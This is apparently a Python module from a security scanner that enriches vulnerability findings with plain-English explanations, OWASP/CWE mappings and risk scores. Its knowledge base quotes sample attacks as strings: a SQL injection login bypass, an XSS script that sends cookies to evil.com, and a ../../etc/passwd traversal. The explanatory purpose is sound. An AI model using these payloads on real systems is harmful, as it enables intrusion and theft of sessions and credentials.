"""
Explainable Vulnerability Engine.

Enriches raw vulnerability findings with human-readable explanations,
impact statements, OWASP references, and actionable remediation advice.

This module acts as the "AI explanation layer" — in production it can be
wired to an LLM API for dynamic explanations.  By default it uses a rich
static knowledge base so the project works without any external service.
"""
from functools import lru_cache
from typing import Dict, List, Optional

from backend.detectors.base import Severity, VulnerabilityFinding
from backend.utils.logger import get_logger

logger = get_logger(__name__)


# ── Plain-English risk descriptions ───────────────────────────────────────────
# One short, friendly sentence per vuln_type — deliberately written for
# non-technical readers and surfaced as the "What this means" banner on the
# dashboard's vulnerability card.

_PLAIN: Dict[str, str] = {
    "SQL Injection":
        "Attackers can trick your website into giving away or changing the data "
        "in your database — including user logins, customer details, and orders.",
    "XSS":
        "Attackers can hide malicious code in your site that runs in visitors' "
        "browsers — stealing their session, redirecting them, or showing fake content.",
    "Missing Security Header":
        "Your website is missing a safety setting that tells the browser how to "
        "behave. Without it, visitors are more exposed to common web attacks.",
    "Weak SSL/TLS Configuration":
        "The encryption that protects data travelling to your site is outdated or "
        "weak. Someone watching the network could read or change that data.",
    "Dangerous Open Port":
        "A service on your server is reachable from the network that probably "
        "shouldn't be. It widens the attack surface — close it or restrict access.",
    "Weak SSH Configuration":
        "The remote-login service on your server is using out-of-date settings. "
        "It is easier for attackers to break in or eavesdrop on the connection.",
    "Directory Traversal":
        "A page on your site can be tricked into showing files it shouldn't — "
        "config files, passwords, source code — by changing the URL.",
    "Insecure HTTP Methods":
        "Your server accepts web requests it doesn't need to. Attackers can use "
        "these extra request types to upload, delete, or trace requests.",
    "Information Disclosure":
        "Your server is telling visitors what software and version it runs. "
        "That makes it easier for attackers to pick the right exploit.",
    "NSE Vulnerability":
        "A known security flaw was detected for a service running on your server. "
        "Apply the vendor patch or restrict access to that port as soon as possible.",
    "Open Service Detected":
        "A service was found running on this port. Check whether it really needs "
        "to be reachable from the network it is exposed to.",
}

_PLAIN_DEFAULT = (
    "A potential security issue was detected. Review the technical detail and "
    "follow the remediation steps to reduce the risk."
)

_SEVERITY_BLURB: Dict[str, str] = {
    "CRITICAL":
        "This is an urgent issue. Treat it as a top priority — attackers can use "
        "it right now and the impact is severe.",
    "HIGH":
        "This is a serious issue. Plan to fix it in the next maintenance window.",
    "MEDIUM":
        "This is a noticeable risk. Fix when you can; don't ignore it.",
    "LOW":
        "This is a minor risk. Worth tightening up but not an emergency.",
    "INFO":
        "This is informational — no immediate action required, but useful to know.",
}


# ── Knowledge base ────────────────────────────────────────────────────────────
# Each entry keyed by vuln_type provides additional context to overlay on
# findings produced by the detectors.

_KB: Dict[str, dict] = {
    "SQL Injection": {
        "short_name": "SQLi",
        "description": (
            "SQL Injection occurs when user-controlled input is concatenated directly "
            "into SQL queries without sanitisation.  The database engine interprets "
            "the injected code as legitimate SQL commands."
        ),
        "attack_scenario": (
            "An attacker submits ' OR '1'='1 as a login username.  If the query is "
            "SELECT * FROM users WHERE username='$input', it becomes "
            "SELECT * FROM users WHERE username='' OR '1'='1', returning all users."
        ),
        "business_impact": (
            "Data breach, authentication bypass, data destruction, and in some "
            "configurations, OS-level command execution."
        ),
        "owasp": "A03:2021 – Injection",
        "cwe": "CWE-89",
        "cvss_range": "7.0 – 9.8 (Critical)",
        "references": [
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
    },
    "XSS": {
        "short_name": "XSS",
        "description": (
            "Cross-Site Scripting allows attackers to inject client-side scripts into "
            "pages viewed by other users.  Reflected XSS echoes input immediately; "
            "Stored XSS persists in the database and executes for every visitor."
        ),
        "attack_scenario": (
            "An attacker crafts a URL with <script>document.location='evil.com/?c='+document.cookie</script> "
            "in a search parameter.  The victim clicks the link; their session cookie is stolen."
        ),
        "business_impact": (
            "Session hijacking, credential theft, DOM manipulation, malware distribution, "
            "and defacement."
        ),
        "owasp": "A03:2021 – Injection",
        "cwe": "CWE-79",
        "cvss_range": "6.1 – 8.8 (High)",
        "references": [
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        ],
    },
    "Missing Security Header": {
        "short_name": "Missing Header",
        "description": (
            "HTTP security headers instruct browsers to enforce protective policies. "
            "Their absence leaves users vulnerable to a range of client-side attacks."
        ),
        "attack_scenario": (
            "Without Content-Security-Policy, injected scripts execute freely. "
            "Without X-Frame-Options, the site can be embedded in an attacker's iframe "
            "to perform Clickjacking."
        ),
        "business_impact": "Enables XSS, Clickjacking, MIME sniffing, and protocol downgrade attacks.",
        "owasp": "A05:2021 – Security Misconfiguration",
        "cwe": "CWE-693",
        "cvss_range": "3.1 – 7.5 (Low to High)",
        "references": [
            "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
            "https://securityheaders.com/",
        ],
    },
    "Weak SSL/TLS Configuration": {
        "short_name": "Weak TLS",
        "description": (
            "Weak TLS configurations expose encrypted communication to decryption and "
            "MITM attacks through outdated protocols or cipher suites."
        ),
        "attack_scenario": (
            "An adversary on the network performs a POODLE attack by downgrading "
            "the connection to SSLv3 and decrypting cookie values."
        ),
        "business_impact": "Decryption of sensitive data in transit, credential theft, session hijacking.",
        "owasp": "A02:2021 – Cryptographic Failures",
        "cwe": "CWE-326",
        "cvss_range": "5.9 – 9.1 (Medium to Critical)",
        "references": [
            "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
            "https://www.ssllabs.com/ssltest/",
        ],
    },
    "Dangerous Open Port": {
        "short_name": "Open Port",
        "description": (
            "Unnecessary network services increase the attack surface. "
            "Some ports are associated with services that have well-known exploits."
        ),
        "attack_scenario": (
            "Redis exposed on port 6379 without authentication allows an attacker "
            "to write SSH authorised_keys and gain shell access to the server."
        ),
        "business_impact": "Remote code execution, data exfiltration, lateral movement.",
        "owasp": "A05:2021 – Security Misconfiguration",
        "cwe": "CWE-732",
        "cvss_range": "5.0 – 9.8 (Medium to Critical)",
        "references": [
            "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        ],
    },
    "Weak SSH Configuration": {
        "short_name": "Weak SSH",
        "description": (
            "SSH misconfigurations such as protocol v1, outdated versions, "
            "or verbose banners weaken remote access security."
        ),
        "attack_scenario": (
            "An attacker fingerprints OpenSSH 6.x and exploits CVE-2016-6515 "
            "to cause a denial of service or leverages authentication weaknesses."
        ),
        "business_impact": "Unauthorised remote access, credential brute-force, DoS.",
        "owasp": "A05:2021 – Security Misconfiguration",
        "cwe": "CWE-326",
        "cvss_range": "3.1 – 9.8",
        "references": [
            "https://infosec.mozilla.org/guidelines/openssh",
        ],
    },
    "Directory Traversal": {
        "short_name": "Path Traversal",
        "description": (
            "Path traversal allows attackers to access files outside the intended "
            "web root by manipulating file-path parameters with ../ sequences."
        ),
        "attack_scenario": (
            "An endpoint accepts ?file=report.pdf.  An attacker changes it to "
            "?file=../../../../etc/passwd and receives the Unix password file."
        ),
        "business_impact": "Source code disclosure, credential file access, configuration leakage.",
        "owasp": "A01:2021 – Broken Access Control",
        "cwe": "CWE-22",
        "cvss_range": "6.5 – 9.1",
        "references": [
            "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
        ],
    },
    "Insecure HTTP Methods": {
        "short_name": "HTTP Methods",
        "description": (
            "HTTP methods such as TRACE, PUT, and DELETE are dangerous when enabled "
            "on production servers.  TRACE enables XST; PUT/DELETE allow file manipulation."
        ),
        "attack_scenario": (
            "A server with TRACE enabled allows an attacker to perform Cross-Site Tracing: "
            "injected JavaScript sends a TRACE request and reads the echoed HttpOnly cookies."
        ),
        "business_impact": "Credential theft, file system manipulation, open-proxy abuse.",
        "owasp": "A05:2021 – Security Misconfiguration",
        "cwe": "CWE-16",
        "cvss_range": "5.0 – 8.1",
        "references": [
            "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        ],
    },
    "Information Disclosure": {
        "short_name": "Info Disclosure",
        "description": (
            "The application leaks internal implementation details through response headers, "
            "error messages, or banners, aiding attackers in targeting specific CVEs."
        ),
        "attack_scenario": (
            "The Server: Apache/2.4.49 header reveals the exact version, which has a known "
            "path traversal vulnerability (CVE-2021-41773)."
        ),
        "business_impact": "Facilitates targeted exploitation of known vulnerabilities.",
        "owasp": "A05:2021 – Security Misconfiguration",
        "cwe": "CWE-200",
        "cvss_range": "3.1 – 5.3",
        "references": [
            "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        ],
    },
}


@lru_cache(maxsize=256)
def _kb_lookup(vuln_type: str) -> dict:
    """Memoised KB lookup — KB is read-only at runtime."""
    return _KB.get(vuln_type, {})


class VulnerabilityExplainer:
    """Enriches VulnerabilityFinding objects with detailed explanations."""

    def explain(self, finding: VulnerabilityFinding) -> dict:
        """
        Return a fully-enriched explanation dictionary for *finding*.

        The output is consumed by the report generator and API response layer.
        Includes plain-English `non_technical` and `severity_blurb` fields so
        the dashboard can render warnings that non-technical users understand.
        """
        kb_entry = _kb_lookup(finding.vuln_type)
        sev_value = finding.severity.value

        return {
            "name": finding.name,
            "vuln_type": finding.vuln_type,
            "severity": sev_value,
            "cvss_score": finding.cvss_score,
            "owasp_mapping": finding.owasp_mapping or kb_entry.get("owasp", "N/A"),
            "cwe": kb_entry.get("cwe", "N/A"),

            # Plain-English layer (for non-technical readers)
            "non_technical": _PLAIN.get(finding.vuln_type, _PLAIN_DEFAULT),
            "severity_blurb": _SEVERITY_BLURB.get(sev_value, ""),

            # Explanation layers (technical)
            "summary": finding.explanation,
            "description": kb_entry.get("description", finding.technical_description),
            "attack_scenario": kb_entry.get("attack_scenario", ""),
            "impact": finding.impact or kb_entry.get("business_impact", ""),

            # Remediation
            "fix": finding.fix,
            "references": kb_entry.get("references", []),

            # Evidence
            "cve_references": finding.cve_references,
            "affected_url": finding.affected_url,
            "affected_port": finding.affected_port,
            "payload_used": finding.payload_used,
            "response_snippet": finding.response_snippet,
        }

    def explain_batch(self, findings: List[VulnerabilityFinding]) -> List[dict]:
        """Enrich a list of findings."""
        return [self.explain(f) for f in findings]

    def severity_summary(self, findings: List[VulnerabilityFinding]) -> dict:
        """Return a severity-count dictionary for dashboard display."""
        counts: Dict[str, int] = {s.value: 0 for s in Severity}
        for f in findings:
            counts[f.severity.value] += 1
        return counts

    def risk_score(self, findings: List[VulnerabilityFinding]) -> float:
        """
        Calculate a normalised risk score (0-10) based on CVSS scores and
        severity distribution.
        """
        if not findings:
            return 0.0
        weights = {
            Severity.CRITICAL: 1.0,
            Severity.HIGH: 0.8,
            Severity.MEDIUM: 0.5,
            Severity.LOW: 0.2,
            Severity.INFO: 0.0,
        }
        total = sum(
            (f.cvss_score or 5.0) * weights.get(f.severity, 0.5) for f in findings
        )
        score = min(10.0, total / max(len(findings), 1))
        return round(score, 2)
